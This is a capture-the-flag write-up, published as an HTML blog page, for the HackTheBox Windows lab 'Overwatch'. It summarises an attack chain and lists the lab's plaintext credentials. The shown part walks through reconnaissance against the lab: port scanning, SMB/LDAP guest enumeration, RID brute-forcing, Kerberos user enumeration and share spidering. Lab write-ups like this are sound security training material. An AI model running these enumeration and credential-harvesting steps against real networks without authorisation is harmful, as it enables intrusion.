@@ -1,0 +1,1145 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      HackTheBox: Overwatch &middot; tralsesec
+    
+  </title>
+
+  <!-- CSS -->
+  <!--<link rel="stylesheet" href="public/css/poole.css">-->
+  <!--<link rel="stylesheet" href="public/css/blackdoc.css">-->
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/modern.css">
+  <!--<link rel="stylesheet" href="public/css/operator.css">-->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=EB+Garamond">
+  <!-- Icons -->
+  <link rel="apple-touch-icon" sizes="144x144" href="/public/apple-touch-icon.png">
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+</head>
+
+
+  <body>
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky" style="display: flex; flex-direction: column; height: 100%;">
+    
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          tralsesec
+        </a>
+      </h1>
+      <p class="lead">Offensive Security Researcher · Malware Developer & Analyst · Exploit Developer · CTF Player</p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+      <a class="sidebar-nav-item" href="/about">About</a>
+      <a class="sidebar-nav-item" href="/projects">Projects</a>
+      <a class="sidebar-nav-item" href="/anatomy-of-a-bug">Anatomy of a Bug</a>
+      <a class="sidebar-nav-item active" href="/ctfs">Capture the Flags</a>
+
+      <hr style="border: 0; border-top: 1px solid var(--border); margin: 1.5rem 0;">
+
+      <a class="sidebar-nav-item" href="https://x.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        X
+      </a>
+
+      <a class="sidebar-nav-item" href="https://github.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+        GitHub
+      </a>
+
+      <a class="sidebar-nav-item" href="https://app.hackthebox.com/public/users/475600" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M11.99 0l-10.4 6.02v12.01l10.4 6.02 10.4-6.02V6.02L11.99 0zM3.46 17.2V6.9l8.53-4.93 8.53 4.93v10.3l-8.53 4.93-8.53-4.93z"/><path d="M11.99 3.5L4.8 7.66v8.32l7.19 4.16 7.19-4.16V7.66L11.99 3.5zm5.72 11.53l-5.72 3.31-5.72-3.31V8.47l5.72-3.31 5.72 3.31v6.56z"/></svg>
+        HackTheBox
+      </a>
+
+    </nav>
+
+    <p style="margin-top: auto; padding-top: 2rem; margin-bottom: 0; font-size: 0.9rem;">
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title" style="line-height: 1.3; padding-bottom: 1.3rem;">HackTheBox: Overwatch</h1>
+
+  <div class="post-meta" style="font-family: var(--font-mono); font-size: 0.75em; margin-bottom: 2rem;">
+    
+      <div style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center;">
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #WINDOWS
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #REVERSE-ENGINEERING
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #MSSQL
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #DNS-ABUSE
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #SOAP
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #OS-COMMAND-INJECTION
+          </span>
+        
+        <span class="post-date" style="color: var(--fg-dim);">// 2026-05-09</span>
+      </div>
+    
+  </div>
+
+  
+     <div class="intel-frame" style="padding: 5px; background: #000; transition: transform 0.2s ease;">
+      <a href="/assets/img/ctf/overwatch.png" target="_blank" style="border: none; display: block;">
+        <img src="/assets/img/ctf/overwatch.png" style="width: 30%; border-color: #000; display: block; cursor: zoom-in; margin-left: auto; margin-right: auto;">
+      </a>
+    </div>   
+  
+
+  <br><br>
+
+  <h1 id="-overwatch">🎯 Overwatch</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>OS:</strong> Windows</td>
+      <td><strong>Difficulty:</strong> Medium</td>
+      <td><strong>IP:</strong> <code class="language-plaintext highlighter-rouge">10.129.50.147</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/img/ctf/data/overwatch-htb.png" alt="overwatch.htb" /></p>
+
+<hr />
+
+<h2 id="️-tldr--attack-chain">⛓️ TL;DR / Attack Chain</h2>
+<ol>
+  <li><strong>Foothold:</strong> Public share for <code class="language-plaintext highlighter-rouge">guest</code>, downloaded <code class="language-plaintext highlighter-rouge">overwatch.exe</code>, got credentials for <code class="language-plaintext highlighter-rouge">sqlsvc</code>.</li>
+  <li><strong>PrivEsc:</strong> <code class="language-plaintext highlighter-rouge">sqlsvc</code> -&gt; MSSQL linked server execution after DNS abusing, got credentials for <code class="language-plaintext highlighter-rouge">sqlmgmt</code>. Then exploited OS-Command Injection vulnerability in local <code class="language-plaintext highlighter-rouge">:8000/MonitorService</code> and got <code class="language-plaintext highlighter-rouge">Administrator</code>.</li>
+</ol>
+
+<hr />
+
+<h2 id="-loot--creds">🔑 Loot &amp; Creds</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">User</th>
+      <th style="text-align: left">Password</th>
+      <th style="text-align: left">Where / How</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">sqlsvc</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">TI0LKcfHzZw1Vv</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">overwatch.exe</code> decompiled</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">sqlmgmt</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">bIhBbzMMnB82yx</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">responder</code> after pointing DNS record <code class="language-plaintext highlighter-rouge">SQL07</code> to our IP and authenticating via linked MSSQL server</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="-0-setup--global-variables">🔧 0. Setup &amp; Global Variables</h2>
+<p><em>Run this in your terminal once so you can copy-paste the rest of the commands blindly.</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">export </span><span class="nv">IP</span><span class="o">=</span><span class="s2">"10.129.50.147"</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  <span class="nb">export </span><span class="nv">DOMAIN</span><span class="o">=</span><span class="s2">"overwatch.htb"</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$IP</span><span class="s2"> </span><span class="nv">$DOMAIN</span><span class="s2"> OVERWATCH.HTB"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-1-enumeration">🔍 1. Enumeration</h2>
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir </span>nmap <span class="o">&amp;&amp;</span> nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nv">$IP</span> <span class="nt">-oA</span> ./nmap
+
+Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-05-08 18:57 +0200
+Nmap scan report <span class="k">for </span>overwatch.htb <span class="o">(</span>10.129.50.147<span class="o">)</span>
+Host is up <span class="o">(</span>0.033s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65514 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT      STATE SERVICE       VERSION
+53/tcp    open  tcpwrapped
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2026-05-08 16:58:59Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: overwatch.htb, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: overwatch.htb, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: OVERWATCH
+|   NetBIOS_Domain_Name: OVERWATCH
+|   NetBIOS_Computer_Name: S200401
+|   DNS_Domain_Name: overwatch.htb
+|   DNS_Computer_Name: S200401.overwatch.htb
+|   DNS_Tree_Name: overwatch.htb
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-05-08T16:59:47+00:00
+|_ssl-date: 2026-05-08T17:00:27+00:00<span class="p">;</span> 0s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>S200401.overwatch.htb
+| Not valid before: 2026-05-07T16:55:02
+|_Not valid after:  2026-11-06T16:55:02
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00<span class="p">;</span> RTM
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2026-05-08T16:57:17
+|_Not valid after:  2056-05-08T16:57:17
+|_ssl-date: 2026-05-08T17:00:27+00:00<span class="p">;</span> 0s from scanner time.
+| ms-sql-ntlm-info:
+|   10.129.50.147:6520:
+|     Target_Name: OVERWATCH
+|     NetBIOS_Domain_Name: OVERWATCH
+|     NetBIOS_Computer_Name: S200401
+|     DNS_Domain_Name: overwatch.htb
+|     DNS_Computer_Name: S200401.overwatch.htb
+|     DNS_Tree_Name: overwatch.htb
+|_    Product_Version: 10.0.20348
+| ms-sql-info:
+|   10.129.50.147:6520:
+|     Version:
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: <span class="nb">false</span>
+|_    TCP port: 6520
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+51759/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+51760/tcp open  msrpc         Microsoft Windows RPC
+61546/tcp open  msrpc         Microsoft Windows RPC
+61563/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: S200401<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+| smb2-time:
+|   <span class="nb">date</span>: 2026-05-08T16:59:51
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>202.84 seconds
+</code></pre></div></div>
+
+<h3 id="dig">Dig</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dig axfr @<span class="nv">$IP</span> <span class="nv">$DOMAIN</span>
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.20.22-1-Debian &lt;&lt;<span class="o">&gt;&gt;</span> axfr @10.129.50.147 overwatch.htb
+<span class="p">;</span> <span class="o">(</span>1 server found<span class="o">)</span>
+<span class="p">;;</span> global options: +cmd
+<span class="p">;</span> Transfer failed.
+</code></pre></div></div>
+
+<h3 id="service-smb--ldap">Service: SMB &amp; LDAP</h3>
+
+<p>Enumerating with null session / anonymous bind.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nxc smb <span class="nv">$IP</span> <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
+SMB         10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          <span class="o">[</span>+] overwatch.htb<span class="se">\:</span>
+SMB         10.129.50.147   445    S200401          <span class="o">[</span>-] Error enumerating shares: STATUS_ACCESS_DENIED
+
+<span class="nv">$ </span>nxc ldap <span class="nv">$IP</span> <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--users</span>
+LDAP        10.129.50.147   389    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span> <span class="o">(</span>signing:None<span class="o">)</span> <span class="o">(</span>channel binding:No TLS cert<span class="o">)</span>
+LDAP        10.129.50.147   389    S200401          <span class="o">[</span>-] Error <span class="k">in </span>searchRequest -&gt; operationsError: 000004DC: LdapErr: DSID-0C090D0D, comment: In order to perform this operation a successful <span class="nb">bind </span>must be completed on the connection., data 0, v4f7c
+LDAP        10.129.50.147   389    S200401          <span class="o">[</span>+] overwatch.htb<span class="se">\:</span>
+LDAP        10.129.50.147   389    S200401          <span class="o">[</span>-] Error <span class="k">in </span>searchRequest -&gt; operationsError: 000004DC: LdapErr: DSID-0C090D0D, comment: In order to perform this operation a successful <span class="nb">bind </span>must be completed on the connection., data 0, v4f7c
+</code></pre></div></div>
+
+<p>Nothing to see here except for <code class="language-plaintext highlighter-rouge">Null Auth:True</code> meaning we should be able to access the public <code class="language-plaintext highlighter-rouge">IPC$</code> share - AND - <code class="language-plaintext highlighter-rouge">signing:True</code> meaning relay attacks won’t work.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nxc smb <span class="nv">$IP</span> <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--rid-brute</span>
+SMB         10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          <span class="o">[</span>+] overwatch.htb<span class="se">\:</span>
+SMB         10.129.50.147   445    S200401          <span class="o">[</span>-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span class="o">{</span>Access Denied<span class="o">}</span> A process has requested access to an object but has not been granted those access rights.
+</code></pre></div></div>
+
+<p>Classic <code class="language-plaintext highlighter-rouge">Windows Server 2022</code> behavior. Microsoft has shut down access to LSA (Local Security Authority) via null sessions in the latest versions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>enum4linux <span class="nv">$IP</span>
+Starting enum4linux v0.9.1 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Fri May  8 19:19:47 2026
+
+ <span class="o">=========================================(</span> Target Information <span class="o">)=========================================</span>
+
+Target ........... 10.129.50.147
+RID Range ........ 500-550,1000-1050
+Username ......... <span class="s1">''</span>
+Password ......... <span class="s1">''</span>
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+&lt;SNIP&gt;
+</code></pre></div></div>
+
+<p>Also nothing really but the usernames.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>kerbrute userenum <span class="nt">-d</span> <span class="nv">$DOMAIN</span> <span class="nt">--dc</span> <span class="nv">$IP</span> /usr/share/seclists/Usernames/Names/names.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 05/08/26 - Ronnie Flathers @ropnop
+
+2026/05/08 19:22:21 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2026/05/08 19:22:21 <span class="o">&gt;</span>  	10.129.50.147:88
+
+2026/05/08 19:22:48 <span class="o">&gt;</span>  Done! Tested 10713 usernames <span class="o">(</span>0 valid<span class="o">)</span> <span class="k">in </span>27.148 seconds
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'sql\nmssql\nsvc_sql\nsql_svc\nbackup\nadmin\nadministrator\noverwatch'</span> <span class="o">&gt;</span> services.txt <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  impacket-GetNPUsers <span class="nv">$DOMAIN</span>/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> services.txt <span class="nt">-format</span> hashcat <span class="nt">-dc-ip</span> <span class="nv">$IP</span>
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
+<span class="o">[</span>-] User administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+</span></code></pre></div></div>
+
+<p>Even no service accounts can be found. Very strange.</p>
+
+<p>But finally something (using <code class="language-plaintext highlighter-rouge">guest</code> account):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nxc smb <span class="nv">$IP</span> <span class="nt">-u</span> <span class="s1">'guest'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span> <span class="p">;</span> <span class="se">\</span>
+  nxc smb <span class="nv">$IP</span> <span class="nt">-u</span> <span class="s1">'guest'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--rid-brute</span> <span class="p">;</span> <span class="se">\</span>
+  nxc smb <span class="nv">$IP</span> <span class="nt">-u</span> <span class="s1">'guest'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--users</span>
+
+SMB         10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          <span class="o">[</span>+] overwatch.htb<span class="se">\g</span>uest:
+SMB         10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerated shares
+SMB         10.129.50.147   445    S200401          Share           Permissions     Remark
+SMB         10.129.50.147   445    S200401          <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.129.50.147   445    S200401          ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.129.50.147   445    S200401          C<span class="nv">$ </span>                             Default share
+SMB         10.129.50.147   445    S200401          IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.129.50.147   445    S200401          NETLOGON                        Logon server share
+SMB         10.129.50.147   445    S200401          software<span class="nv">$ </span>      READ
+SMB         10.129.50.147   445    S200401          SYSVOL                          Logon server share
+SMB         10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          <span class="o">[</span>+] overwatch.htb<span class="se">\g</span>uest:
+SMB         10.129.50.147   445    S200401          498: OVERWATCH<span class="se">\E</span>nterprise Read-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          500: OVERWATCH<span class="se">\A</span>dministrator <span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          501: OVERWATCH<span class="se">\G</span>uest <span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          502: OVERWATCH<span class="se">\k</span>rbtgt <span class="o">(</span>SidTypeUser<span class="o">)</span>
+&lt;SNIP&gt;
+SMB         10.129.50.147   445    S200401          1101: OVERWATCH<span class="se">\D</span>nsAdmins <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1102: OVERWATCH<span class="se">\D</span>nsUpdateProxy <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1103: OVERWATCH<span class="se">\S</span>QLServer2005SQLBrowserUser<span class="nv">$S200401</span> <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1104: OVERWATCH<span class="se">\s</span>qlsvc <span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1105: OVERWATCH<span class="se">\s</span>qlmgmt <span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1106: OVERWATCH<span class="se">\S</span>QL03<span class="nv">$ </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1107: OVERWATCH<span class="se">\N</span>B001<span class="nv">$ </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1108: OVERWATCH<span class="se">\N</span>B002<span class="nv">$ </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1109: OVERWATCH<span class="se">\F</span>ILE01<span class="nv">$ </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1110: OVERWATCH<span class="se">\S</span>200400<span class="nv">$ </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1111: OVERWATCH<span class="se">\e</span>mployees <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1112: OVERWATCH<span class="se">\C</span>harlie.Moss <span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          1113: OVERWATCH<span class="se">\T</span>racy.Burns <span class="o">(</span>SidTypeUser<span class="o">)</span>
+&lt;SNIP&gt;
+SMB         10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          <span class="o">[</span>+] overwatch.htb<span class="se">\g</span>uest:
+</code></pre></div></div>
+
+<p>Here we go! Big users list and public shares!</p>
+
+<p>Yoink all <code class="language-plaintext highlighter-rouge">SMB ... OVERWARTCH\&lt;USERNAME&gt; ...</code> into a file called <code class="language-plaintext highlighter-rouge">users.txt</code> then call this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>users.txt | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">' '</span> <span class="s1">' { print $6 } '</span> <span class="o">&gt;</span> users_.txt <span class="o">&amp;&amp;</span> <span class="nb">mv </span>users_.txt users.txt
+</code></pre></div></div>
+
+<p>Now we got a beautiful users list with 133 usernames!</p>
+
+<p>Let’s connect to shares and see what’s inside them:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nxc smb <span class="nv">$IP</span> <span class="nt">-u</span> <span class="s1">'guest'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-M</span> spider_plus <span class="nt">-o</span> <span class="nv">DOWNLOAD_FLAG</span><span class="o">=</span>True
+
+SMB         10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+SMB         10.129.50.147   445    S200401          <span class="o">[</span>+] overwatch.htb<span class="se">\g</span>uest:
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Started module spidering_plus with the following options:
+SPIDER_PLUS 10.129.50.147   445    S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span>  DOWNLOAD_FLAG: True
